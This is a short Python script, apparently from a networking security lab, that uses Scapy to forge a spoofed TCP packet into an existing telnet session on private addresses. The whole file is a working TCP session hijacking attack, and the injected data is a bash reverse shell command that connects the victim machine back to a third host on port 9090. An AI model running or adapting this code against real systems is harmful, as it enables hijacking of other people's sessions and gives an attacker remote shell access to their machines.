import sys
from scapy.all import *
print("SENDING SESSION HIJACKING PACKET.........")
IPLayer = IP(src="172.16.133.130", dst="172.16.133.128")
TCPLayer = TCP(sport=55540, dport=23, flags="A",
seq=3647438544, ack=2547496984)
Data = "\r /bin/bash -i > /dev/tcp/172.16.133.129/9090 2>&1 0<&1\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)